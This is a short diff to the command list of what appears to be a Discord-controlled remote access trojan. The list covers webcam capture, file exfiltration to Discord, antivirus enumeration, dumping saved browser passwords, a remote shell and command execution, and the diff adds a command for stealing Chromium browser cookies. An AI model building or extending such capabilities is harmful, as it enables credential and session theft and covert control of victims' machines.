@@ -32,6 +32,7 @@ getcam {machine_name} : Get snapshot from all video sources on specified machine
 getfile {machine_name} {file_path} : Upload file located in {file_path} on specified machine to Discord.
 getav {machine_name} : Get all antivirus products installed on specified machine.
 getlogins {machine_name} : Get saved Chromium-based browser passwords on specified machine.
+getcookies {machine_name} : Get saved Chromium-based browser cookies on specified machine.
 
 shell {machine_name} : Start remote shell on specified machine.
 command {machine_name} {command} : Execute command on specified machine.
